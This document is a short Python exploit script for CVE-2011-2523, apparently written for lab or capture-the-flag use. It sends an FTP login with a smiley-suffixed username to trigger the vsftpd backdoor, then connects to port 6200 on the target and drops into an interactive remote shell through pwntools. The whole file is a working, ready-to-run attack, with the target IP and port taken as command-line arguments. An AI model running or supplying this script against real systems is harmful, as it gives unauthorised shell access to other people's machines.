import argparse
from ftplib import FTP
from pwn import *
import threading


def custom_hook(args):
    # report the failure
    print(f'Thread failed: {args.exc_value}')
    print('Dont worry, normal behaviour')


def connect_ftp():
    ftp = FTP()
    ftp.connect(args.ip, args.port)  # don't you love sharing data
    ftp.login("lol:)", "yeah__no")


def connect_shell():
    time.sleep(1)
    r = remote(args.ip, 6200)
    r.interactive()


parser = argparse.ArgumentParser(description='Exploit code for CVE-2011-2523')
parser.add_argument('--ip', required=True, help='IP of the target host')
parser.add_argument('--port', required=False, default=21, help='Port running the vulnerable service')
args = parser.parse_args()

threading.excepthook = custom_hook
t1 = threading.Thread(target=connect_ftp, daemon=True, name='FTP').start()
connect_shell()
